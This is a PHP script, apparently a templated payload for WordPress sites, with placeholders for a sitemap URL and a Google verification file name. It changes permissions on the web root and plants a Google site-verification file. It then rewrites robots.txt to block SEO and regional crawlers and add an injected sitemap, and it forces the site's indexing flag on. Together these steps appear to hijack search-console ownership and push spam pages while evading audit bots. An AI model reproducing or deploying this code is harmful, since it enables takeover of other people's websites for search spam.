$Sitemap = '__SITEMAP__';
$googleFile = '__GOOGLE_FILE__';

$googleFileContent = 'google-site-verification: ' . basename($googleFile);
$rootDir = $_SERVER['DOCUMENT_ROOT'];
if (chmod($rootDir, 0755)) {
	echo "Chmod 0755\n";
} else {
	echo "Не получилось изменить права\n";
}
$googleFilePath = $rootDir . '/' . $googleFile;
if (file_put_contents($googleFilePath, $googleFileContent) !== false) {
	$fileContent = file_get_contents($googleFilePath);
	if ($fileContent === $googleFileContent) {
		echo "Google verification file was created successfully.\n";
	} else {
		echo "Google verification file was created but content is incorrect!\n";
	}
} else {
	echo "Failed to create Google verification file.\n";
}

SITEMAP($Sitemap);
FlagEngine($rootDir);

function SITEMAP($Sitemap) {
	$robotsFile = $_SERVER['DOCUMENT_ROOT'] . '/robots.txt';
	$searchText = "User-agent: Baiduspider\nDisallow: /\nUser-agent: AhrefsBot\nDisallow: /\nUser-agent: MJ12bot\nDisallow: /\nUser-agent: BLEXBot\nDisallow: /\nUser-agent: DotBot\nDisallow: /\nUser-agent: SemrushBot\nDisallow: /\nUser-agent: YandexBot\nDisallow: /\nUser-agent: *\nAllow: /";
	$searchPattern = "/User-agent: Baiduspider\s*\nDisallow: \/\s*\nUser-agent: AhrefsBot\s*\nDisallow: \/\s*\nUser-agent: MJ12bot\s*\nDisallow: \/\s*\nUser-agent: BLEXBot\s*\nDisallow: \/\s*\nUser-agent: DotBot\s*\nDisallow: \/\s*\nUser-agent: SemrushBot\s*\nDisallow: \/\s*\nUser-agent: YandexBot\s*\nDisallow: \/\s*\nUser-agent: \*\s*\nAllow: /";
	$additionalText = "\nSitemap: {$Sitemap}";

	if (file_exists($robotsFile)) {
		$content = file_get_contents($robotsFile);
		if (preg_match($searchPattern, $content)) {
			if (strpos($content, $additionalText) === false) {
				file_put_contents($robotsFile, $content . $additionalText, LOCK_EX);
				echo "Sitemap added to robots.txt\n";
			} else {
				echo "Sitemap already exists in robots.txt.\n";
			}
		} else {
			file_put_contents($robotsFile, $searchText . $additionalText, LOCK_EX);
			echo "robots.txt was correctly updated.\n";
		}
	} else {
		if (file_put_contents($robotsFile, $searchText . $additionalText, LOCK_EX) !== false) {
			echo "robots.txt was created successfully.\n";
		} else {
			echo "Failed to create robots.txt.\n";
		}
	}
}

function FlagEngine($rootDir) {
	$wpConfigPath = $rootDir . '/wp-config.php';
	if (file_exists($wpConfigPath)) {
		if (!defined('ABSPATH')) {
			require_once $rootDir . '/wp-config.php';
			require_once $rootDir . '/wp-load.php';
		}

		if (function_exists('update_option') && function_exists('get_option')) {
			$current_status = get_option('blog_public');

			if ($current_status == '1') {
				echo "Флажок запрета индексации отсутствует.\n";
			} else {
				update_option('blog_public', '1');
				echo "Флажок запрета индексации снят.\n";
			}
		} else {
			echo "Не удалось найти функции WordPress. Убедитесь, что скрипт выполняется в контексте WordPress.\n";
		}
	} else {
		echo "WordPress не установлен или скрипт не находится в корневой папке WordPress.\n";
	}
}